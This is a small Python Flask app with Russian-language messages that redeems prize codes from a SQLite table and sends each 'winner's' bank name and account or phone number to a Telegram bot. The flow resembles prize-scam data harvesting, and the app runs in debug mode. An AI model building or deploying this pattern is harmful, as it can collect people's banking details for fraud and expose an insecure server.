from flask import Flask, request, jsonify, send_from_directory
import sqlite3, os, requests

app = Flask(__name__, static_folder='static')

BOT_TOKEN = 'YOUR_BOT_TOKEN'
CHAT_ID = 'YOUR_CHAT_ID'

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/check-code', methods=['POST'])
def check_code():
    code = request.json.get('code', '').strip()
    conn = sqlite3.connect('codes.db')
    cur = conn.cursor()
    cur.execute("SELECT prize, used FROM codes WHERE check_code=?", (code,))
    row = cur.fetchone()
    if row:
        prize, used = row
        if used:
            return jsonify({'success': False, 'message': 'Код уже использован'})
        cur.execute("UPDATE codes SET used=1 WHERE check_code=?", (code,))
        conn.commit()
        return jsonify({'success': True, 'prize': prize})
    return jsonify({'success': False, 'message': 'Неверный код'})

@app.route('/send-details', methods=['POST'])
def send_details():
    data = request.json
    message = f"🏦 Новый победитель:\nБанк: {data['bank']}\nСчёт/телефон: {data['account']}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={'chat_id': CHAT_ID, 'text': message})
    return '', 200

if __name__ == '__main__':
    app.run(debug=True)
